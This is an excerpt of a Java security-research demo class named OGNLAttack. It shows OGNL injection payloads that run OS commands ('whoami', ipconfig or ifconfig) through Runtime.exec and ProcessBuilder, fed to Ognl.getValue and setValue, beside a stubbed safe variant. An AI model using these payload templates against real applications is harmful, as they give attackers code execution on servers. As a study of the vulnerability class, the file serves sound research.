 ...
 * @author Whoopsunix
 */
public class OGNLAttack {

    public static void main(String[] args) throws Exception {
        new OGNLAttack().getValueDemo();
    }

    public void getValueDemo() throws Exception {
        /**
         * 无回显 get触发
         */
...
//        String IOUtilsPayload1 = "{(new java.lang.String(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('whoami').getInputStream())))}";
        ...
        String processBuilderPayload2 = "{(#iswin=(new java.lang.Boolean(\"true\")).booleanValue())?(#cmds=(new java.lang.String[]{\"cmd.exe\",\"/c\",\"ipconfig\"})):(#cmds=(new java.lang.String[]{\"/bin/sh\",\"-c\",\"ifconfig\"})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(new java.io.ByteArrayOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}";
...
//        // 用 IOUtils 实现
    ...
    public void setValueDemo() throws Exception {
        /**
         * 无回显 set触发
         */
     ...
     * ognl.Ognl#getValue()
     */
    public static Object ognlGetValue(String payload) throws Exception {
        Object obj = Ognl.getValue(payload, null);
        return obj;
    }

    public static Object ognlGetValueSafe(String payload) throws Exception {
     ...
     * ognl.Ognl#setValue()
     */
    public static void ognlSetValue(String payload) throws Exception {
